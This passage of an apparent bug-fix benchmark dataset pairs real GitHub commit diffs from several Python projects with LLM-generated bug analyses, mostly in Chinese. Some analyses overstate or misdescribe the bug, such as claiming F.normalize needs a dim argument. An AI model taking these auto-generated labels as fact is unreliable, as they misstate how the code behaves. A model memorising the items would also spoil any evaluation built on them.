WeightDrop(torch.nn.LSTM(10, 10), ['weight_hh_l0'], dropout=0.9)\n+    wdrnn.cuda()\n+\n+    run1 = [x.sum() for x in wdrnn(x, h0)[0].data]\n+    run2 = [x.sum() for x in wdrnn(x, h0)[0].data]\n+\n+    print('First timesteps should be equal, all others should differ')\n+    print('Run 1:', run1)\n+    print('Run 2:', run2)\n+\n+    # First time step, not influenced by hidden to hidden weights, should be equal\n+    assert run1[0] == run2[0]\n+    # Second step should not\n+    assert run1[1] != run2[1]\n+\n+    print('---')", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "rnn_flatten_parameters_issue", "bug_description": "buggy_code 在处理 RNN 模块时，由于 PyTorch 的 flatten_parameters 方法在权重被修改后会导致 CUDA 错误，程序会在运行时崩溃。fixed_code 通过检查模块是否为 RNNBase 子类，并替换 flatten_parameters 为一个空函数来避免此问题。"}}}
{"id": "bugfix023", "buggy_file": "data/raw_new/bugfix023_buggy.py", "fixed_file": "data/raw_new/bugfix023_fixed.py", "meta": {"repo": "cfzd/Ultra-Fast-Lane-Detection", "file": "train.py", "buggy_sha": "bb673eb816e5c5356dcab02d72feb937fbb445b6", "fixed_sha": "d0da95463a247d9006e3ff8a63c7ec1a05d17c3f", "commit_message": "bug fix for long label", "changes": 4, "patch": "@@ -17,12 +17,12 @@\n def inference(net, data_label, use_aux):\n     if use_aux:\n         img, cls_label, seg_label = data_label\n-        img, cls_label, seg_label = img.cuda(), cls_label.cuda(), seg_label.cuda()\n+        img, cls_label, seg_label = img.cuda(), cls_label.long().cuda(), seg_label.long().cuda()\n         cls_out, seg_out = net(img)\n         return {'cls_out': cls_out, 'cls_label': cls_label, 'seg_out':seg_out, 'seg_label': seg_label}\n     else:\n         img, cls_label = data_label\n-        img, cls_label = img.cuda(), cls_label.cuda()\n+        img, cls_label = img.cuda(), cls_label.long().cuda()\n         cls_out = net(img)\n         return {'cls_out': cls_out, 'cls_label': cls_label}\n ", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "missing_long_conversion_for_labels", "bug_description": "在buggy_code中，分类标签(cls_label)和分割标签(seg_label)在移动到GPU时缺少.long()转换，导致标签数据类型不正确。PyTorch的损失函数通常需要标签为long类型，否则会抛出运行时错误。fixed_code通过添加.long()转换确保标签具有正确的数据类型。"}}}
{"id": "bugfix024", "buggy_file": "data/raw_new/bugfix024_buggy.py", "fixed_file": "data/raw_new/bugfix024_fixed.py", "meta": {"repo": "cfzd/Ultra-Fast-Lane-Detection", "file": "utils/common.py", "buggy_sha": "e6b4913910ff7744f90ed42d2c721742a1c4daed", "fixed_sha": "fa552c99bf01d3be3770ea6284fd6847547786c2", "commit_message": "Update common.py\n\nbug fix", "changes": 4, "patch": "@@ -42,7 +42,7 @@ def get_args():\n     parser.add_argument('--resume', default = None, type = str)\n     parser.add_argument('--test_model', default = None, type = str)\n     parser.add_argument('--test_work_dir', default = None, type = str)\n-\n+    parser.add_argument('--num_lanes', default = None, type = int)\n     return parser\n \n def merge_config():\n@@ -104,4 +104,4 @@ def get_logger(work_dir, cfg):\n         with open(config_txt, 'w') as fp:\n             fp.write(str(cfg))\n \n-    return logger\n\\ No newline at end of file\n+    return logger", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "missing_num_lanes_argument", "bug_description": "在buggy_code中，get_args()函数缺少对--num_lanes命令行参数的定义，但在merge_config()函数中却尝试从args中获取num_lanes属性。当用户尝试通过命令行设置num_lanes参数时，程序会抛出AttributeError异常，因为args对象没有num_lanes属性。fixed_code通过在get_args()中添加parser.add_argument('--num_lanes', default = None, type = int)来修复这个问题。"}}}
{"id": "bugfix025", "buggy_file": "data/raw_new/bugfix025_buggy.py", "fixed_file": "data/raw_new/bugfix025_fixed.py", "meta": {"repo": "cfzd/Ultra-Fast-Lane-Detection", "file": "evaluation/eval_wrapper.py", "buggy_sha": "02b69313b8cfc3317a405354c676dc2f51469ae5", "fixed_sha": "590cf6baa04d1552058911c2622ecf95bee14c70", "commit_message": "bug fix for windows", "changes": 23, "patch": "@@ -4,6 +4,7 @@\n from utils.dist_utils import is_main_process, dist_print, get_rank, get_world_size, dist_tqdm, synchronize\n import os, json, torch, scipy\n import numpy as np\n+import platform\n \n def generate_lines(out, shape, names, output_path, griding_num, localization_type='abs', flip_updown=False):\n \n@@ -202,24 +203,28 @@ def call_culane_eval(data_dir, exp_name,output_path):\n     out7=os.path.join(output_path,'txt','out7_cross.txt')\n     out8=os.path.join(output_path,'txt','out8_night.txt')\n \n+    eval_cmd = './evaluation/culane/evaluate'\n+    if platform.system() == 'Windows':\n+        eval_cmd = eval_cmd.replace('/', os.sep)\n+\n     # print('./evaluate -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(data_dir,detect_dir,data_dir,list0,w_lane,iou,im_w,im_h,frame,out0))\n-    os.system('./evaluation/culane/evaluate -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(data_dir,detect_dir,data_dir,list0,w_lane,iou,im_w,im_h,frame,out0))\n+    os.system('%s -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(eval_cmd,data_dir,detect_dir,data_dir,list0,w_lane,iou,im_w,im_h,frame,out0))\n     # print('./evaluate -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(data_dir,detect_dir,data_dir,list1,w_lane,iou,im_w,im_h,frame,out1))\n-    os.system('./evaluation/culane/evaluate -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(data_dir,detect_dir,data_dir,list1,w_lane,iou,im_w,im_h,frame,out1))\n+    os.system('%s -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(eval_cmd,data_dir,detect_dir,data_dir,list1,w_lane,iou,im_w,im_h,frame,out1))\n     # print('./evaluate -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(data_dir,detect_dir,data_dir,list2,w_lane,iou,im_w,im_h,frame,out2))\n-    os.system('./evaluation/culane/evaluate -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(data_dir,detect_dir,data_dir,list2,w_lane,iou,im_w,im_h,frame,out2))\n+    os.system('%s -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(eval_cmd,data_dir,detect_dir,data_dir,list2,w_lane,iou,im_w,im_h,frame,out2))\n     # print('./evaluate -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(data_dir,detect_dir,data_dir,list3,w_lane,iou,im_w,im_h,frame,out3))\n-    os.system('./evaluation/culane/evaluate -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(data_dir,detect_dir,data_dir,list3,w_lane,iou,im_w,im_h,frame,out3))\n+    os.system('%s -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(eval_cmd,data_dir,detect_dir,data_dir,list3,w_lane,iou,im_w,im_h,frame,out3))\n     # print('./evaluate -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(data_dir,detect_dir,data_dir,list4,w_lane,iou,im_w,im_h,frame,out4))\n-    os.system('./evaluation/culane/evaluate -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(data_dir,detect_dir,data_dir,list4,w_lane,iou,im_w,im_h,frame,out4))\n+    os.system('%s -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(eval_cmd,data_dir,detect_dir,data_dir,list4,w_lane,iou,im_w,im_h,frame,out4))\n     # print('./evaluate -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(data_dir,detect_dir,data_dir,list5,w_lane,iou,im_w,im_h,frame,out5))\n-    os.system('./evaluation/culane/evaluate -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(data_dir,detect_dir,data_dir,list5,w_lane,iou,im_w,im_h,frame,out5))\n+    os.system('%s -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(eval_cmd,data_dir,detect_dir,data_dir,list5,w_lane,iou,im_w,im_h,frame,out5))\n     # print('./evaluate -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(data_dir,detect_dir,data_dir,list6,w_lane,iou,im_w,im_h,frame,out6))\n-    os.system('./evaluation/culane/evaluate -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(data_dir,detect_dir,data_dir,list6,w_lane,iou,im_w,im_h,frame,out6))\n+    os.system('%s -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(eval_cmd,data_dir,detect_dir,data_dir,list6,w_lane,iou,im_w,im_h,frame,out6))\n     # print('./evaluate -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(data_dir,detect_dir,data_dir,list7,w_lane,iou,im_w,im_h,frame,out7))\n-    os.system('./evaluation/culane/evaluate -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(data_dir,detect_dir,data_dir,list7,w_lane,iou,im_w,im_h,frame,out7))\n+    os.system('%s -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(eval_cmd,data_dir,detect_dir,data_dir,list7,w_lane,iou,im_w,im_h,frame,out7))\n     # print('./evaluate -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(data_dir,detect_dir,data_dir,list8,w_lane,iou,im_w,im_h,frame,out8))\n-    os.system('./evaluation/culane/evaluate -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(data_dir,detect_dir,data_dir,list8,w_lane,iou,im_w,im_h,frame,out8))\n+    os.system('%s -a %s -d %s -i %s -l %s -w %s -t %s -c %s -r %s -f %s -o %s'%(eval_cmd,data_dir,detect_dir,data_dir,list8,w_lane,iou,im_w,im_h,frame,out8))\n     res_all = {}\n     res_all['res_normal'] = read_helper(out0)\n     res_all['res_crowd']= read_helper(out1)", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "windows_path_separator_issue", "bug_description": "在buggy_code中，call_culane_eval函数直接使用'./evaluation/culane/evaluate'作为命令路径，这在Windows系统上会因为路径分隔符不兼容而导致FileNotFoundError或命令执行失败。fixed_code通过导入platform模块，检测操作系统类型，如果是Windows系统则将路径分隔符替换为os.sep，确保跨平台兼容性。"}}}
{"id": "bugfix026", "buggy_file": "data/raw_new/bugfix026_buggy.py", "fixed_file": "data/raw_new/bugfix026_fixed.py", "meta": {"repo": "BlankerL/DXY-COVID-19-Crawler", "file": "service/crawler.py", "buggy_sha": "72ab7fabb0f6af1188456a1312555ee3ffea1485", "fixed_sha": "5a9093187f98f3a71b43431acc1e8f695d6e837f", "commit_message": "Bug fixed", "changes": 1, "patch": "@@ -66,7 +66,6 @@ def crawler(self):\n                 self.rumor_parser(rumors=rumors)\n \n             if not overall_information or \\\n-                    not province_information or \\\n                     not area_information or \\\n                     not abroad_information or \\\n                     not news or \\", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "undefined_variable_in_condition", "bug_description": "在buggy_code的crawler方法中，条件检查使用了未定义的变量'province_information'，这会导致NameError异常。fixed版本移除了这个未定义的变量引用，只检查实际获取到的信息变量。"}}}
{"id": "bugfix027", "buggy_file": "data/raw_new/bugfix027_buggy.py", "fixed_file": "data/raw_new/bugfix027_fixed.py", "meta": {"repo": "iambus/xunlei-lixian", "file": "lixian_commands/config.py", "buggy_sha": "ac605e88bef536b8ebf44692081b7c204879598c", "fixed_sha": "9662beff218daf7fe8ea2fb609603da232909b80", "commit_message": "fix login issue", "changes": 5, "patch": "@@ -1,6 +1,5 @@\n \n \n-from lixian import encypt_password\n from lixian_commands.util import *\n from lixian_cli_parser import *\n from lixian_config import *\n@@ -29,8 +28,8 @@ def lx_config(args):\n \t\t\t\tpassword = getpass('Password: ')\n \t\t\telse:\n \t\t\t\tpassword = args[1]\n-\t\t\tprint 'Saving password (encrypted) to', global_config.path\n-\t\t\tput_config('password', encypt_password(password))\n+\t\t\tprint 'Saving password to', global_config.path\n+\t\t\tput_config('password', password)\n \t\telse:\n \t\t\tprint 'Saving configuration to', global_config.path\n \t\t\tput_config(*args)", "syntax_error": true, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "missing_encypt_password_import", "bug_description": "buggy_code 中导入了 encypt_password 函数但实际没有这个模块，会导致 ImportError。fixed_code 移除了这个错误的导入，并且不再对密码进行加密处理，直接保存明文密码。"}}}
{"id": "bugfix028", "buggy_file": "data/raw_new/bugfix028_buggy.py", "fixed_file": "data/raw_new/bugfix028_fixed.py", "meta": {"repo": "iambus/xunlei-lixian", "file": "lixian_commands/readd.py", "buggy_sha": "de9e9140988a62c6a7b0fc35e72b6c3cd71367b8", "fixed_sha": "e8afff72f83d32538f837a0fd44ecae5aa7adf81", "commit_message": "fix `lx add info-hash`", "changes": 2, "patch": "@@ -37,4 +37,4 @@ def readd_task(args):\n \t\turls, ids = zip(*non_bt)\n \t\tclient.add_batch_tasks(urls, ids)\n \tfor hash, id in bt:\n-\t\tclient.add_torrent_task_by_info_hash2(hash, id)\n+\t\tclient.add_torrent_task_by_info_hash(hash, id)", "syntax_error": true, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "wrong_method_call_for_torrent_readd", "bug_description": "Buggy code calls client.add_torrent_task_by_info_hash2() which is likely a non-existent or incorrect method, causing AttributeError at runtime. Fixed version correctly calls client.add_torrent_task_by_info_hash() to properly re-add torrent tasks."}}}
{"id": "bugfix029", "buggy_file": "data/raw_new/bugfix029_buggy.py", "fixed_file": "data/raw_new/bugfix029_fixed.py", "meta": {"repo": "iambus/xunlei-lixian", "file": "lixian_commands/login.py", "buggy_sha": "3da6253ba6c4f3c552a1deaabf7378ab886eeb60", "fixed_sha": "a711fcbabb76f0c0a1663888b1d799d3d64f0a72", "commit_message": "fix #374: add verificiation code when adding a batch of tasks", "changes": 19, "patch": "@@ -7,23 +7,9 @@\n import lixian_help\n from getpass import getpass\n \n-def file_path_verification_code_reader(path):\n-\tdef reader(image):\n-\t\twith open(path, 'wb') as output:\n-\t\t\toutput.write(image)\n-\t\tprint 'Verification code picture is saved to %s, please open it manually and enter what you see.' % path\n-\t\tcode = raw_input('Verification code: ')\n-\t\treturn code\n-\treturn reader\n-\n-def verification_code_reader(args):\n-\tif args.verification_code_path:\n-\t\treturn file_path_verification_code_reader(args.verification_code_path)\n-\n @command_line_parser(help=lixian_help.login)\n @with_parser(parse_login)\n @with_parser(parse_logging)\n-@command_line_value('verification-code-path')\n def login(args):\n \tif args.cookies == '-':\n \t\targs._args['cookies'] = None\n@@ -51,5 +37,6 @@ def login(args):\n \t\tprint 'Saving login session to', args.cookies\n \telse:\n \t\tprint 'Testing login without saving session'\n-\targs.verification_code_reader = verification_code_reader(args)\n-\tXunleiClient(args.username, args.password, args.cookies, login=True, verification_code_reader=args.verification_code_reader)\n\\ No newline at end of file\n+\timport lixian_verification_code\n+\tverification_code_reader = lixian_verification_code.default_verification_code_reader(args)\n+\tXunleiClient(args.username, args.password, args.cookies, login=True, verification_code_reader=verification_code_reader)", "syntax_error": true, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "missing_verification_code_reader", "bug_description": "在buggy_code中，当没有提供验证码路径参数时，verification_code_reader函数返回None，导致XunleiClient在需要验证码时会因传入None而报错。fixed_code通过导入lixian_verification_code模块并使用default_verification_code_reader函数来确保始终提供有效的验证码读取器。"}}}
{"id": "bugfix030", "buggy_file": "data/raw_new/bugfix030_buggy.py", "fixed_file": "data/raw_new/bugfix030_fixed.py", "meta": {"repo": "iambus/xunlei-lixian", "file": "lixian_commands/util.py", "buggy_sha": "3da6253ba6c4f3c552a1deaabf7378ab886eeb60", "fixed_sha": "a711fcbabb76f0c0a1663888b1d799d3d64f0a72", "commit_message": "fix #374: add verificiation code when adding a batch of tasks", "changes": 5, "patch": "@@ -12,6 +12,7 @@\n @command_line_value('username', default=get_config('username'))\n @command_line_value('password', default=get_config('password'))\n @command_line_value('cookies', default=LIXIAN_DEFAULT_COOKIES)\n+@command_line_value('verification-code-path')\n def parse_login(args):\n \tif args.password == '-':\n \t\targs.password = getpass('Password: ')\n@@ -50,7 +51,9 @@ def parse_size(args):\n \n def create_client(args):\n \tfrom lixian import XunleiClient\n-\tclient = XunleiClient(args.username, args.password, args.cookies)\n+\timport lixian_verification_code\n+\tverification_code_reader = lixian_verification_code.default_verification_code_reader(args)\n+\tclient = XunleiClient(args.username, args.password, args.cookies, verification_code_reader=verification_code_reader)\n \tif args.page_size:\n \t\tclient.page_size = int(args.page_size)\n \treturn client", "syntax_error": true, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "missing_verification_code_support", "bug_description": "buggy_code 缺少验证码支持，当需要验证码登录时会失败。fixed_code 在 parse_login 中添加了 verification-code-path 参数，并在 create_client 中创建了验证码读取器传递给 XunleiClient，从而支持验证码登录流程。"}}}
{"id": "bugfix031", "buggy_file": "data/raw_new/bugfix031_buggy.py", "fixed_file": "data/raw_new/bugfix031_fixed.py", "meta": {"repo": "iambus/xunlei-lixian", "file": "lixian_commands/delete.py", "buggy_sha": "b811ccdad4b939b29879ab4bfa5f2ba3618039d4", "fixed_sha": "acc8ca00af8388f5094d7776afd0dbbd2df4ddb2", "commit_message": "fix #371: lx delete --failed", "changes": 6, "patch": "@@ -13,6 +13,7 @@\n @with_parser(parse_logging)\n @command_line_option('i')\n @command_line_option('all')\n+@command_line_option('failed')\n @command_line_value('limit', default=get_config('limit'))\n @command_line_value('page-size', default=get_config('page-size'))\n def delete_task(args):\n@@ -26,11 +27,12 @@ def delete_task(args):\n \t\tfor x in to_delete:\n \t\t\tprint x['name'].encode(default_encoding)\n \tif args.i:\n-\t\tyes_or_no = raw_input('Are your sure to delete below files from Xunlei cloud? ')\n+\t\tyes_or_no = raw_input('Are your sure to delete them from Xunlei cloud? (y/n) ')\n \t\twhile yes_or_no.lower() not in ('y', 'yes', 'n', 'no'):\n \t\t\tyes_or_no = raw_input('yes or no? ')\n \t\tif yes_or_no.lower() in ('y', 'yes'):\n \t\t\tpass\n \t\telif yes_or_no.lower() in ('n', 'no'):\n-\t\t\traise RuntimeError('Deletion abort per user request.')\n+\t\t\tprint 'Deletion abort per user request.'\n+\t\t\treturn\n \tclient.delete_tasks(to_delete)", "syntax_error": true, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "unnecessary_exception_on_user_cancel", "bug_description": "在buggy_code中，当用户选择不删除文件时（输入'n'或'no'），代码会抛出RuntimeError异常，这会导致程序异常终止。在fixed_code中，改为打印提示信息并正常返回，避免了不必要的异常抛出，使程序能够优雅地处理用户取消操作。"}}}
{"id": "bugfix032", "buggy_file": "data/raw_new/bugfix032_buggy.py", "fixed_file": "data/raw_new/bugfix032_fixed.py", "meta": {"repo": "iambus/xunlei-lixian", "file": "lixian_commands/download.py", "buggy_sha": "9df0807782773df03990502fdfb784a16c8d129f", "fixed_sha": "e59f3c926abaa73b88a4d64dcdef0376f0713d53", "commit_message": "if hash fails, don't delete file. instead, rename it to *.error", "changes": 2, "patch": "@@ -95,7 +95,7 @@ def download2(client, url, path, task):\n \t\tif not verify(path, task):\n \t\t\twith colors(options.get('colors')).yellow():\n \t\t\t\tprint 'hash error, redownloading...'\n-\t\t\tos.remove(path)\n+\t\t\tos.rename(path, path + '.error')\n \t\t\tdownload1_checked(client, url, path, size)\n \t\t\tif not verify(path, task):\n \t\t\t\traise Exception('hash check failed')", "syntax_error": true, "llm_analysis": {"is_bug": true, "is_runtime_error": false, "short_label": "hash_check_file_deletion_bug", "bug_description": "在buggy_code中，当哈希检查失败时，代码会立即删除文件(os.remove(path))然后重新下载。如果重新下载也失败，原始文件就丢失了。fixed版本将文件重命名为.error后缀，保留了原始文件以便调试和恢复。"}}}
{"id": "bugfix033", "buggy_file": "data/raw_new/bugfix033_buggy.py", "fixed_file": "data/raw_new/bugfix033_fixed.py", "meta": {"repo": "s0md3v/ReconDog", "file": "plugins/findSubdomains.py", "buggy_sha": "98f984ba034b5857585247a5a78d492da361346a", "fixed_sha": "7ea2c7100f5a582b9b8dc3e1897517ffc8f51bb6", "commit_message": "fixed subdomain enumeration", "changes": 3, "patch": "@@ -1,11 +1,10 @@\n import sys\n from re import findall\n-from tld import get_tld\n from requests import get\n \n def findSubdomains(host):\n     response = get('https://findsubdomains.com/subdomains-of/' +\n-                   get_tld(host, fix_protocol=True)).text\n+                   host).text\n     matches = findall(r'(?s)<div class=\"domains js-domain-name\">(.*?)</div>', response)\n     for match in matches:\n         sys.stdout.write(match.replace(' ', '').replace('\\n', '') + '\\n')", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "incorrect_host_parameter_processing", "bug_description": "buggy_code 错误地使用了 get_tld 函数来处理 host 参数，这会导致当输入不是完整 URL 时（如 'example.com'）get_tld 函数可能抛出异常。fixed_code 直接使用原始的 host 参数，避免了不必要的域名解析和可能的运行时错误。"}}}
{"id": "bugfix034", "buggy_file": "data/raw_new/bugfix034_buggy.py", "fixed_file": "data/raw_new/bugfix034_fixed.py", "meta": {"repo": "konradhalas/dacite", "file": "dacite/types.py", "buggy_sha": "a86ef2036b60e9a008714ac9d0919f18529203fc", "fixed_sha": "e9e99e831b7f71fcbae21b7dca9856684a7093f7", "commit_message": "Fix tests (#203)\n\n* Fix performance tests to properly create dataclass instances\r\n\r\n* Add missing tests to have 100% coverage\r\n\r\n* Disable commenting on alerts", "changes": 2, "patch": "@@ -177,7 +177,7 @@ def is_generic_collection(type_: Type) -> bool:\n \n def extract_generic(type_: Type, defaults: Tuple = ()) -> tuple:\n     try:\n-        if hasattr(type_, \"_special\") and type_._special:\n+        if getattr(type_, \"_special\", False):\n             return defaults\n         if type_.__args__ == ():\n             return (type_.__args__,)", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "attribute_error_on_special_types", "bug_description": "在 extract_generic 函数中，buggy_code 直接访问 type_._special 属性，当 type_ 没有 _special 属性时会抛出 AttributeError。fixed_code 使用 getattr(type_, \"_special\", False) 安全地获取属性值，避免了运行时异常。"}}}
{"id": "bugfix035", "buggy_file": "data/raw_new/bugfix035_buggy.py", "fixed_file": "data/raw_new/bugfix035_fixed.py", "meta": {"repo": "3DTopia/LGM", "file": "core/models.py", "buggy_sha": "310e0dced01a1b6cee83cc9ba92daca0fe67749c", "fixed_sha": "9a0797cdbacf8e6216d0108cb00cbe43b9cb3d81", "commit_message": "fix rotation normalization", "changes": 2, "patch": "@@ -40,7 +40,7 @@ def __init__(\n         self.pos_act = lambda x: x.clamp(-1, 1)\n         self.scale_act = lambda x: 0.1 * F.softplus(x)\n         self.opacity_act = lambda x: torch.sigmoid(x)\n-        self.rot_act = F.normalize\n+        self.rot_act = lambda x: F.normalize(x, dim=-1)\n         self.rgb_act = lambda x: 0.5 * torch.tanh(x) + 0.5 # NOTE: may use sigmoid if train again\n \n         # LPIPS loss", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "missing_dim_in_normalize", "bug_description": "在buggy_code中，rot_act直接使用F.normalize函数而没有指定dim参数，这会导致运行时错误，因为F.normalize需要明确指定归一化的维度。fixed_code通过添加lambda函数并指定dim=-1来修复这个问题，确保对旋转向量在最后一个维度上进行归一化。"}}}
{"id": "bugfix036", "buggy_file": "data/raw_new/bugfix036_buggy.py", "fixed_file": "data/raw_new/bugfix036_fixed.py", "meta": {"repo": "pytest-dev/pytest-cov", "file": "ci/bootstrap.py", "buggy_sha": "b5991fbaf25d07405a379a3a5675501bda06614f", "fixed_sha": "97aadd74bcbc00a2078d240e8fe871dd62b83d80", "commit_message": "Update some ci config, reformat and apply some lint fixes.", "changes": 4, "patch": "@@ -20,8 +20,6 @@ def exec_in_env():\n     else:\n         bin_path = env_path / 'bin'\n     if not env_path.exists():\n-        import subprocess\n-\n         print(f'Making bootstrap env in: {env_path} ...')\n         try:\n             check_call([sys.executable, '-m', 'venv', env_path])\n@@ -59,7 +57,7 @@ def main():\n         # This uses sys.executable the same way that the call in\n         # cookiecutter-pylibrary/hooks/post_gen_project.py\n         # invokes this bootstrap.py itself.\n-        for line in subprocess.check_output([sys.executable, '-m', 'tox', '--listenvs'], text=True).splitlines()\n+        for line in subprocess.check_output([sys.executable, '-m', 'tox', '--listenvs'], universal_newlines=True).splitlines()\n     ]\n     tox_environments = [line for line in tox_environments if line.startswith('py')]\n     for template in templates_path.rglob('*'):", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "subprocess_text_parameter_compatibility", "bug_description": "buggy_code 使用了 subprocess.check_output() 的 text=True 参数，这个参数在 Python 3.7 之前不可用。在旧版本 Python 中会导致 AttributeError。fixed_code 将其改为 universal_newlines=True，这是 Python 3.7 之前版本中实现相同功能的兼容性参数。"}}}
{"id": "bugfix037", "buggy_file": "data/raw_new/bugfix037_buggy.py", "fixed_file": "data/raw_new/bugfix037_fixed.py", "meta": {"repo": "pytest-dev/pytest-cov", "file": "setup.py", "buggy_sha": "629ba644a56148d09fe0f2c20602681bc20027a7", "fixed_sha": "512c6699010cc0d8145f1f926d876cafba840015", "commit_message": "Added minium version requirements for pluggin (for new-style hookwrappers). Pytest 6.2.5 is the minimum pytest that will work with that pluggy anyway, so bump that too. Fixes #698.", "changes": 3, "patch": "@@ -124,8 +124,9 @@ def run(self):\n     ],\n     python_requires='>=3.9',\n     install_requires=[\n-        'pytest>=4.6',\n+        'pytest>=6.2.5',\n         'coverage[toml]>=7.5',\n+        'pluggy>=1.2',\n     ],\n     extras_require={\n         'testing': [", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "incompatible_dependency_versions", "bug_description": "buggy_code 使用了过时的 pytest>=4.6 依赖版本，与较新的 Python 版本和 pytest-cov 功能不兼容，可能导致运行时兼容性错误。fixed_code 将依赖更新为 pytest>=6.2.5 并添加了 pluggy>=1.2 依赖，确保与当前 Python 版本和 pytest 生态系统的兼容性。"}}}
{"id": "bugfix038", "buggy_file": "data/raw_new/bugfix038_buggy.py", "fixed_file": "data/raw_new/bugfix038_fixed.py", "meta": {"repo": "mozilla-services/syncserver", "file": "syncserver/__init__.py", "buggy_sha": "d9253211837c94c93ea285c4894646590dfdc2ab", "fixed_sha": "58b8036179061c340590ef04e3da6084b6145350", "commit_message": "Merge pull request #256 from mozilla-services/revert/syncstorage-rs\n\nRevert \"Fix #246 Switch to syncstorage-rs, and document the additiona…", "changes": 8, "patch": "@@ -5,7 +5,6 @@\n import binascii\n import os\n import logging\n-import subprocess\n try:\n     from urlparse import urlparse, urlunparse, urljoin\n except ImportError:\n@@ -60,8 +59,6 @@ def includeme(config):\n     if sqluri is None:\n         rootdir = os.path.abspath(os.path.dirname(os.path.dirname(__file__)))\n         sqluri = \"sqlite:///\" + os.path.join(rootdir, \"syncserver.db\")\n-    else:\n-        os.environ['SYNC_DATABASE_URL'] = sqluri\n \n     # Automagically configure from IdP if one is given.\n     idp = settings.get(\"syncserver.identity_provider\")\n@@ -158,10 +155,7 @@ def includeme(config):\n \n     # Include the relevant sub-packages.\n     config.scan(\"syncserver\", ignore=[\"syncserver.wsgi_app\"])\n-\n-    os.environ['SYNC_MASTER_SECRET'] = secret\n-    subprocess.call(\"/usr/bin/env sh run-syncstorage-rs.sh &\", shell=True)\n-\n+    config.include(\"syncstorage\", route_prefix=\"/storage\")\n     config.include(\"tokenserver\", route_prefix=\"/token\")\n \n     # Add a top-level \"it works!\" view.", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "missing_syncstorage_include", "bug_description": "buggy_code 版本中缺少对 syncstorage 模块的配置包含，这会导致 /storage 路由无法正常工作。fixed_code 通过添加 config.include(\"syncstorage\", route_prefix=\"/storage\") 来正确配置存储路由，同时移除了不必要的子进程调用和环境变量设置。"}}}
{"id": "bugfix039", "buggy_file": "data/raw_new/bugfix039_buggy.py", "fixed_file": "data/raw_new/bugfix039_fixed.py", "meta": {"repo": "mozilla-services/syncserver", "file": "syncserver/staticnode.py", "buggy_sha": "346d3098683ea7617b9dc5e872f2c3d622664c5e", "fixed_sha": "dc27164a26e5300b25c7edbb4a0eed12c668309f", "commit_message": "Improve support for Python 3.\n\nThis fixes the messages shown in #97 but does not mean there is proper Python 3 support in all used libraries.", "changes": 11, "patch": "@@ -10,7 +10,12 @@\n \n \"\"\"\n import time\n-import urlparse\n+\n+try:\n+    from urlparse import urlparse\n+except ImportError:\n+    from urllib.parse import urlparse\n+\n from mozsvc.exceptions import BackendError\n \n from sqlalchemy import Column, Integer, String, BigInteger, Index\n@@ -98,7 +103,7 @@ class StaticNodeAssignment(object):\n     def __init__(self, sqluri, node_url, **kw):\n         self.sqluri = sqluri\n         self.node_url = node_url\n-        self.driver = urlparse.urlparse(sqluri).scheme.lower()\n+        self.driver = urlparse(sqluri).scheme.lower()\n         sqlkw = {\n             \"logging_name\": \"syncserver\",\n             \"connect_args\": {},\n@@ -111,7 +116,7 @@ def __init__(self, sqluri, node_url, **kw):\n             sqlkw[\"connect_args\"][\"check_same_thread\"] = False\n             # If using a :memory: database, we must use a QueuePool of\n             # size 1 so that a single connection is shared by all threads.\n-            if urlparse.urlparse(sqluri).path.lower() in (\"/\", \"/:memory:\"):\n+            if urlparse(sqluri).path.lower() in (\"/\", \"/:memory:\"):\n                 sqlkw[\"pool_size\"] = 1\n                 